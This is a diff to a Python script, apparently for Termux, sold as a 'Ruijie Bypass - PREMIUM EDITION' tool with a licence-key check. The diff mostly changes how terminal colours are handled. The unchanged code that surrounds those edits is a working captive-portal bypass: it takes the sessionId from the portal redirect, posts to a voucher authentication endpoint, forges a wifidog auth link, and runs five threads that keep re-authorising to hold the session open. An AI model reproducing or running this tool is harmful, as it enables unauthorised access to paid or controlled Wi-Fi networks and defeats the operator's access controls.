@@ -8,34 +8,31 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 RAW_KEY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/bypass-ruijie/refs/heads/main/Key.txt"
 LICENSE_FILE = "license.txt"
 
-# --- COLOR DEFINITIONS (Guaranteed for Termux) ---
-Y = "\033[93m"  # YELLOW
-G = "\033[92m"  # GREEN
-R = "\033[91m"  # RED
-C = "\033[96m"  # CYAN
-W = "\033[97m"  # WHITE
-RESET = "\033[0m"
+# --- SYSTEM COLORS (Native Termux Support) ---
+def col(c):
+    codes = {"Y": "\033[93m", "G": "\033[92m", "R": "\033[91m", 
+             "C": "\033[96m", "W": "\033[97m", "OFF": "\033[0m"}
+    return codes.get(c, "\033[0m")
 
 def banner():
     os.system('clear')
     # ၁။ အဝါရောင် အပေါ်စည်း
-    print(Y + " ="*35 + RESET)
+    print(col("Y") + " ="*35 + col("OFF"))
     
-    # ၂။ Ruijie Logo - အလံအရောင်အတိုင်း တစ်ကြောင်းချင်းစီ အရောင်ထည့်ခြင်း
-    print(Y + "      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗" + RESET)
-    print(Y + "      ██╔══██╗██║   ██║██║     ██║██║██╔════╝" + RESET)
-    print(G + "      ██████╔╝██║   ██║██║     ██║██║█████╗  " + RESET)
-    print(G + "      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  " + RESET)
-    print(R + "      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗" + RESET)
-    print(R + "      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝" + RESET)
+    # ၂။ Ruijie Logo - အဝါ၊ အစိမ်း၊ အနီ တစ်ကြောင်းချင်းစီ Native Color သွင်းခြင်း
+    print(col("Y") + "      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗" + col("OFF"))
+    print(col("Y") + "      ██╔══██╗██║   ██║██║     ██║██║██╔════╝" + col("OFF"))
+    print(col("G") + "      ██████╔╝██║   ██║██║     ██║██║█████╗  " + col("OFF"))
+    print(col("G") + "      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  " + col("OFF"))
+    print(col("R") + "      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗" + col("OFF"))
+    print(col("R") + "      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝" + col("OFF"))
     
     # ၃။ အနီရောင် Premium Edition စာသား
-    print(f"        {R}✨ Ruijie Bypass - PREMIUM EDITION ✨{RESET}")
-    print(Y + " ="*35 + RESET + "\n")
+    print(f"        {col('R')}✨ Ruijie Bypass - PREMIUM EDITION ✨{col('OFF')}")
+    print(col("Y") + " ="*35 + col("OFF") + "\n")
 
 def get_hwid():
     try:
-        # device identification
         return f"ID-{subprocess.check_output(['whoami']).decode().strip()}"
     except:
         return "ID-Unknown"
@@ -44,28 +41,27 @@ def verify():
     hwid = get_hwid()
     banner()
     
-    # Auto Login Success
     if os.path.exists(LICENSE_FILE):
-        print(f"{G}[✓] Status: Active (Auto Login Success){RESET}")
+        print(f"{col('G')}[✓] Status: Active (Auto Login Success){col('OFF')}")
         return True
 
     try:
-        print(f"{W}[*] Connecting to License Server...{RESET}")
+        print(f"{col('W')}[*] Connecting to License Server...{col('OFF')}")
         resp = requests.get(RAW_KEY_URL, timeout=10).text
-        print(f"{W}[+] YOUR DEVICE ID: {Y}{hwid}{RESET}")
-        key = input(f"{Y}[?] ENTER LICENSE KEY: {RESET}").strip()
+        print(f"{col('W')}[+] YOUR DEVICE ID: {col('Y')}{hwid}{col('OFF')}")
+        key = input(f"{col('Y')}[?] ENTER LICENSE KEY: {col('OFF')}").strip()
         
         if f"{key}:{hwid}" in resp:
             with open(LICENSE_FILE, "w") as f:
                 f.write(key)
-            print(f"{G}[✓] Access Granted! License Saved.{RESET}")
+            print(f"{col('G')}[✓] Access Granted! License Saved.{col('OFF')}")
             time.sleep(1)
             return True
         else:
-            print(f"{R}[!] Invalid Key or Unauthorized ID.{RESET}")
+            print(f"{col('R')}[!] Invalid Key or Unauthorized ID.{col('OFF')}")
             sys.exit()
     except:
-        print(f"{R}[!] Server Error: Check Your Internet.{RESET}")
+        print(f"{col('R')}[!] Server Error: Check Your Internet.{col('OFF')}")
         sys.exit()
 
 def check_net():
@@ -80,18 +76,18 @@ def high_speed_pulse(link):
         try:
             session.get(link, timeout=10, verify=False)
             # Bypass Status - အစိမ်းရောင်
-            print(f"{G}[✓] Bypass Active | Pulse: [{random.randint(100,450)}ms]{RESET}      ", end="\r")
+            print(f"{col('G')}[✓] Bypass Active | Pulse: [{random.randint(100,450)}ms]{col('OFF')}      ", end="\r")
         except:
             break
         time.sleep(random.uniform(1.0, 2.5))
 
 def start_bypass():
-    print(f"{C}[*] Attempting to Capture Portal...{RESET}")
+    print(f"{col('C')}[*] Attempting to Capture Portal...{col('OFF')}")
     session = requests.Session()
     while True:
         try:
             if check_net():
-                print(f"{Y}[•] Internet Connected. Monitoring...{RESET}         ", end="\r")
+                print(f"{col('Y')}[•] Internet Connected. Monitoring...{col('OFF')}         ", end="\r")
                 time.sleep(10)
                 continue
 
@@ -104,7 +100,7 @@ def start_bypass():
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             
             if sid:
-                print(f"{G}[✓] SID Captured: {sid[:15]}...{RESET}")
+                print(f"{col('G')}[✓] SID Captured: {sid[:15]}...{col('OFF')}")
                 p_host = f"{urlparse(r.url).scheme}://{urlparse(r.url).netloc}"
                 
                 session.post(f"{p_host}/api/auth/voucher/", 
@@ -116,15 +112,14 @@ def start_bypass():
                 auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                 
                 # Thread Start - အနီရောင်
-                print(f"{R}[*] ⚡ Launching Stability Pulse Threads... ⚡{RESET}")
+                print(f"{col('R')}[*] ⚡ Launching Stability Pulse Threads... ⚡{col('OFF')}")
                 for _ in range(5):
                     threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                 
                 while check_net():
                     time.sleep(5)
             else:
-                # SID Not Found Error
-                print(f"{R}[!] SID Not Found. Retrying in 5s...{RESET}", end="\r")
+                print(f"{col('R')}[!] SID Not Found. Retrying in 5s...{col('OFF')}")
                 time.sleep(5)
         except:
             time.sleep(3)
@@ -134,4 +129,4 @@ if __name__ == "__main__":
         try:
             start_bypass()
         except KeyboardInterrupt:
-            print(f"\n{R}[!] Stopped by User.{RESET}")
+            print(f"\n{col('R')}[!] Stopped by User.{col('OFF')}")
